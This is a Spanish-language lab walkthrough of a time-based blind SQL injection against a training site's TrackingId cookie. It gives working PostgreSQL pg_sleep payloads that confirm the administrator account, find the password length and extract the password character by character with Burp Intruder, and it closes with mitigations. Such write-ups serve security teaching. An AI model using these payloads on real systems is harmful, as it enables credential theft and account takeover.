Blind SQL injection with time delays and information retrieval

Nombre del laboratorio

Inyección SQL ciega con retrasos de tiempo y recuperación de información.

Tipo de SQLi

Inferential SQLi (Time-based) avanzada.

Objetivo del laboratorio

Determinar la longitud de la contraseña del usuario administrator.
Extraer cada carácter de dicha contraseña mediante ataques de fuerza bruta basados en tiempo.
Iniciar sesión en la cuenta del administrador para resolver el laboratorio.

Explicación técnica

El atacante utiliza consultas condicionales que ejecutan un retraso si una suposición sobre los datos es verdadera.
Preguntas Sí/No: Si la condición es cierta, la consulta espera 10 segundos.
Observación del Cronómetro: Respuesta rápida = falso, retraso = verdadero.
Repetición Exhaustiva: Se prueba cada posición y carácter posible.
Sincronía: El retraso en la base de datos se refleja en la respuesta HTTP.

Procedimiento paso a paso

Captura inicial

Acceder al laboratorio con BurpSuite y localizar la cookie TrackingId en HTTP History.

Imagen 1

Prueba de condición verdadera

Payload: TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--. La solicitud tarda 10 segundos en responder.

Imagen 2

Prueba de condición falsa

Payload: TrackingId=x'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--. La respuesta es inmediata.

Imagen 3

Confirmación de usuario administrator

Payload: TrackingId=x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--. La solicitud tarda 10 segundos, confirmando la existencia del usuario.

Imagen 4

Determinación de longitud de contraseña

Payload: TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--. La respuesta tarda 10 segundos, confirmando que la contraseña tiene más de un carácter.

Imagen 5

Confirmación de longitud exacta

Probar con valores crecientes (>2, >3, etc.). Se determina que la contraseña tiene 20 caracteres.

Imagen 6

Extracción de caracteres

Payload: TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--. Se usa Burp Intruder para automatizar pruebas carácter por carácter.

Imagen 7

Configuración de Intruder

Configurar payloads alfanuméricos y limitar a un solo subproceso para medir tiempos de respuesta con precisión.

Imagen 8

Resultados del ataque

Revisar la columna "Response received". El carácter correcto tarda ~10 000 ms en responder.

Imagen 9

Repetición para cada posición

Repetir el ataque para posiciones 2, 3, 4... hasta 20. Se reconstruye la contraseña completa.

Imagen 10

Inicio de sesión

Usar las credenciales obtenidas para acceder como administrator y resolver el laboratorio.

Imagen 11

Mitigaciones recomendadas

Consultas Parametrizadas: Evitar ejecución de funciones inyectadas.
Uso de ORMs Seguros: Automatizar limpieza de datos.
Detección de Anomalías (WAF/IDS): Bloquear múltiples peticiones sospechosas.
Rate Limiting: Restringir número de solicitudes por segundo.
Privilegios Mínimos: Evitar permisos para funciones de tiempo en la base de datos.
